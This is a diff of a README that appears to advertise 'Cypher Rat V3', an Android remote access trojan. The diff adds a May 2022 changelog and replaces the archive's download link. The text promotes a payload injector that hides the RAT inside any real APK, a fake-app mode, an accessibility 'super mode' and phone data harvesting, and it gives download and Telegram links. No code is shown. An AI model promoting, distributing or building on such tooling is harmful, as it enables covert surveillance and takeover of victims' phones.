@@ -19,9 +19,23 @@ you are the only responsible for any kind of use of this tool , the developer is
 
 [TELEGRAM](https://t.me/EvLFDev)
 
+-------------
+
+**UPDATE 5/19/2022** !!  NEW 
+
+1- Can Run on RDP or Virtual Machine
+2- Fix Stuck on builder
+3- Fix File Manager
+4- update stub to stable one
+5- update plugins 
+6- Accept any cypher rat clients
+7- Super mode (accessibility) optional
+8- Fake App Work on All android version
+9- phone info Work on All android version
+
 --------------
 
-**UPDATE 4/16/2022** !!  
+**UPDATE 4/16/2022** !!  OLD
 
 -ADD Cypher Rat injector : cypher jector allows you to inject Any real apk with cypher payload .
 -Login stuck fixed
@@ -69,13 +83,13 @@ Apk features :
 
 Images : 
 
-![Untitled](https://user-images.githubusercontent.com/54191699/154522190-89317b03-ff03-4558-9b7f-8c8e5e026728.png)
+![Untitled](https://user-images.githubusercontent.com/54191699/154522190-89317b03-ff03-4558-9b7f-8c8e5e026728.png  | width=100)
 
-![22](https://user-images.githubusercontent.com/54191699/154522261-deede150-ae0f-4a8b-9f11-ad889c326f90.png)
+![22](https://user-images.githubusercontent.com/54191699/154522261-deede150-ae0f-4a8b-9f11-ad889c326f90.png  | width=100)
 
-![33](https://user-images.githubusercontent.com/54191699/154522444-793a7def-86fa-4529-8962-08937ec05de2.png)
+![33](https://user-images.githubusercontent.com/54191699/154522444-793a7def-86fa-4529-8962-08937ec05de2.png  | width=100)
 
-![sss](https://user-images.githubusercontent.com/54191699/163656673-1101c7a5-2db9-4948-bb0e-2059d6f51b76.png)
+![sss](https://user-images.githubusercontent.com/54191699/163656673-1101c7a5-2db9-4948-bb0e-2059d6f51b76.png  | width=100)
 
 
 --------------
@@ -88,9 +102,9 @@ Images :
 
 --------------
 
-[DOWNLOAD](https://www.mediafire.com/file/q6md47lskb6d2uk/CypherRat-V3-FULL+Jector.rar/file)
+**UPDATE 5/19/2022**
 
-Rar Password: t.me/EvLFDev
+[DOWNLOAD](https://www.mediafire.com/file/nmrpeg05ugyembm/Cypher_Rat_V3_Full_Version.rar/file)
 
 --------------
 
